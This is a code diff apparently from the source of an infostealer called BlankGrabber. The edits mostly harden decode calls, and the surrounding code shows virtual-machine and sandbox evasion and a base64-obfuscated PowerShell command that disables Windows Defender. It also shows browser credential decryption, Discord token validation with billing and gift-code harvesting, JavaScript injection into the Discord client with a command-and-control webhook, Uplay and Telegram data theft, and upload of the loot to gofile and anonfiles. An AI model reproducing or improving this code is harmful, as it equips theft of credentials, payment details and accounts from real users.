@@ -97,7 +97,7 @@ class VmProtect:
         Logger.info("Checking if system is hosted online")
         http = PoolManager(cert_reqs="CERT_NONE")
         try:
-            return http.request('GET', 'http://ip-api.com/line/?fields=hosting').data.decode().strip() == 'true'
+            return http.request('GET', 'http://ip-api.com/line/?fields=hosting').data.decode(errors= "ignore").strip() == 'true'
         except Exception:
             Logger.info("Unable to check if system is hosted online")
             return False
@@ -118,7 +118,7 @@ class VmProtect:
         Logger.info("Checking registry")
         r1 = subprocess.run("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2", capture_output= True, shell= True)
         r2 = subprocess.run("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2", capture_output= True, shell= True)
-        gpucheck = any(x.lower() in subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout.decode().splitlines()[2].strip().lower() for x in ("virtualbox", "vmware"))
+        gpucheck = any(x.lower() in subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout.decode(errors= "ignore").splitlines()[2].strip().lower() for x in ("virtualbox", "vmware"))
         dircheck = any([os.path.isdir(path) for path in ('D:\\Tools', 'D:\\OS2', 'D:\\NT3X')])
         return (r1.returncode != 1 and r2.returncode != 1) or gpucheck or dircheck
 
@@ -261,7 +261,7 @@ class Utility:
 
     @staticmethod
     def DisableDefender() -> None: # Tries to disable the defender
-        command = base64.b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDI=').decode() # Encoded because it triggers antivirus and it can delete the file
+        command = base64.b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDI=').decode(errors= "ignore") # Encoded because it triggers antivirus and it can delete the file
         subprocess.Popen(command, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
     
     @staticmethod
@@ -478,7 +478,7 @@ class Browsers:
                 iv = buffer[3:15]
                 cipherText = buffer[15:]
 
-                return pyaes.AESModeOfOperationGCM(key, iv).decrypt(cipherText)[:-16].decode()
+                return pyaes.AESModeOfOperationGCM(key, iv).decrypt(cipherText)[:-16].decode(errors= "ignore")
             else:
                 return str(Syscalls.CryptUnprotectData(buffer))
         
@@ -689,7 +689,7 @@ class Discord:
         for token in tokens:
             r: HTTPResponse = Discord.httpClient.request("GET", "https://discord.com/api/v9/users/@me", headers= Discord.GetHeaders(token.strip()))
             if r.status == 200:
-                r = r.data.decode()
+                r = r.data.decode(errors= "ignore")
                 r = json.loads(r)
                 user = r['username'] + '#' + str(r['discriminator'])
                 id = r['id']
@@ -707,7 +707,7 @@ class Discord:
 
                 nitro_data = nitro_infos.get(nitro_type, '(Unknown)')
 
-                billing = json.loads(Discord.httpClient.request('GET', 'https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers=Discord.GetHeaders(token)).data.decode())
+                billing = json.loads(Discord.httpClient.request('GET', 'https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers=Discord.GetHeaders(token)).data.decode(errors= "ignore"))
                 if len(billing) == 0:
                     billing = '(No Payment Method)'
                 else:
@@ -728,7 +728,7 @@ class Discord:
                             methods['Paypal'] += 1
                     billing = ', '.join(['{} ({})'.format(name, quantity) for name, quantity in methods.items() if quantity != 0]) or 'None'
                 gifts = list()
-                r = Discord.httpClient.request('GET', 'https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers= Discord.GetHeaders(token)).data.decode()
+                r = Discord.httpClient.request('GET', 'https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers= Discord.GetHeaders(token)).data.decode(errors= "ignore")
                 if 'code' in r:
                     r = json.loads(r)
                     for i in r:
@@ -857,7 +857,7 @@ class Discord:
     def InjectJs() -> str | None: # Injects javascript into the Discord client's file
         check = False
         try:
-            code = base64.b64decode(b"%injectionbase64encoded%").decode().replace("'%WEBHOOKHEREBASE64ENCODED%'", "'{}'".format(base64.b64encode(Settings.C2[1].encode()).decode()))
+            code = base64.b64decode(b"%injectionbase64encoded%").decode(errors= "ignore").replace("'%WEBHOOKHEREBASE64ENCODED%'", "'{}'".format(base64.b64encode(Settings.C2[1].encode()).decode(errors= "ignore")))
         except Exception:
             return None
         
@@ -1066,6 +1066,7 @@ class BlankGrabber:
             if os.path.isdir(uplayPath):
                 for item in os.listdir(uplayPath):
                     if os.path.isfile(os.path.join(uplayPath, item)):
+                        os.makedirs(saveToPath, exist_ok= True)
                         shutil.copy(os.path.join(uplayPath, item), os.path.join(saveToPath, item))
                         self.UplayStolen = True
     
@@ -1178,8 +1179,8 @@ class BlankGrabber:
             saveToDir = os.path.join(self.TempFolder, "System")
 
             process = subprocess.run("systeminfo", capture_output= True, shell= True)
-            if process.returncode == 0:
-                output = process.stdout.decode(errors= "ignore").strip().replace("\r\n", "\n")
+            output = process.stdout.decode(errors= "ignore").strip().replace("\r\n", "\n")
+            if output:
                 os.makedirs(saveToDir, exist_ok= True)
                 with open(os.path.join(saveToDir, "System Info.txt"), "w") as file:
                     file.write(output)
@@ -1254,8 +1255,8 @@ class BlankGrabber:
             saveToDir = os.path.join(self.TempFolder, "System")
 
             process = subprocess.run("tasklist /FO LIST", capture_output= True, shell= True)
-            if process.returncode == 0:
-                output = process.stdout.decode(errors= "ignore").strip().replace("\r\n", "\n")
+            output = process.stdout.decode(errors= "ignore").strip().replace("\r\n", "\n")
+            if output:
                 os.makedirs(saveToDir, exist_ok= True)
                 with open(os.path.join(saveToDir, "Task List.txt"), "w", errors= "ignore") as tasklist:
                     tasklist.write(output)
@@ -1393,7 +1394,7 @@ class BlankGrabber:
                 for path in paths:
                     process = subprocess.run('reg query "{}" /v DisplayIcon'.format(path), shell= True, capture_output= True)
                     if process.returncode == 0:
-                        path = process.stdout.strip().decode().split(" " * 4)[-1].split(",")[0]
+                        path = process.stdout.strip().decode(errors= "ignore").split(" " * 4)[-1].split(",")[0]
                         if "telegram" in path.lower():
                             telegramPaths.append(os.path.dirname(path))
             
@@ -1503,15 +1504,15 @@ class BlankGrabber:
 
             try:
                 1/0
-                server = json.loads(http.request("GET", "https://api.gofile.io/getServer").data.decode())["data"]["server"]
+                server = json.loads(http.request("GET", "https://api.gofile.io/getServer").data.decode(errors= "ignore"))["data"]["server"]
                 if server:
-                    url = json.loads(http.request("POST", "https://{}.gofile.io/uploadFile".format(server), fields= {"file" : (filename, fileBytes)}).data.decode())["data"]["downloadPage"]
+                    url = json.loads(http.request("POST", "https://{}.gofile.io/uploadFile".format(server), fields= {"file" : (filename, fileBytes)}).data.decode(errors= "ignore"))["data"]["downloadPage"]
                     if url:
                         return url
             except Exception:
                 try:
                     Logger.error("Failed to upload to gofile, trying to upload to anonfiles")
-                    url = json.loads(http.request("POST", "https://api.anonfiles.com/upload", fields= {"file" : (filename, fileBytes)}).data.decode())["data"]["file"]["url"]["short"]
+                    url = json.loads(http.request("POST", "https://api.anonfiles.com/upload", fields= {"file" : (filename, fileBytes)}).data.decode(errors= "ignore"))["data"]["file"]["url"]["short"]
                     return url
                 except Exception:
                      Logger.error("Failed to upload to anonfiles")
@@ -1543,7 +1544,7 @@ class BlankGrabber:
             http = PoolManager(cert_reqs="CERT_NONE")
 
             try:
-                r: dict = json.loads(http.request("GET", "http://ip-api.com/json/?fields=225545").data.decode())
+                r: dict = json.loads(http.request("GET", "http://ip-api.com/json/?fields=225545").data.decode(errors= "ignore"))
                 if r.get("status") != "success":
                     raise Exception("Failed")
                 data = f"\nIP: {r['query']}\nRegion: {r['regionName']}\nCountry: {r['country']}\nTimezone: {r['timezone']}\n\n{'Cellular Network:'.ljust(20)} {chr(9989) if r['mobile'] else chr(10062)}\n{'Proxy/VPN:'.ljust(20)} {chr(9989) if r['proxy'] else chr(10062)}"
